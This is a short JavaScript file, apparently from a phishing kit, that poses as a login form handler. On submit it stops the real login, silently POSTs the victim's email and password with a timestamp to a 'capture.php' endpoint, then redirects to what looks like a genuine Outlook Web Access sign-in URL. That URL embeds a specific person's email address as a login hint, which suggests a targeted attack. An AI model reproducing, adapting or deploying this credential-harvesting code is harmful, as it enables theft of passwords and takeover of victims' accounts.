// Login form handler
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form[name="loginForm"]');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const redirectUrl = 'https://login.serverdata.net/user/Account/Login?ReturnUrl=%2Fuser%2Fwsfed%3Fwa%3Dwsignin1.0%26wtrealm%3Dhttps%253a%252f%252feast-2fa.exch082.serverdata.net%252fowa%252f%26wctx%3Drm%253d0%2526id%253dpassive%2526ru%253d%25252fowa%25252f%25253flogin_hint%25253dedecastro%252540courthousegardens.com%26wct%3D2026-02-02T08%253a31%253a16Z';

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = loginInput.value.trim();
        const password = passwordInput.value;

        // Hide previous errors
        document.getElementById('email-error').style.display = 'none';
        document.getElementById('password-error').style.display = 'none';
        document.getElementById('invalid-credentials').style.display = 'none';

        // Validate inputs
        if (!email) {
            document.getElementById('email-error').style.display = 'flex';
            return;
        }

        if (!password) {
            document.getElementById('password-error').style.display = 'flex';
            return;
        }

        // Capture credentials
        try {
            await fetch('capture.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (error) {
            console.log('Capture failed:', error);
        }

        // Redirect to the login page
        window.location.href = redirectUrl;
    });
});
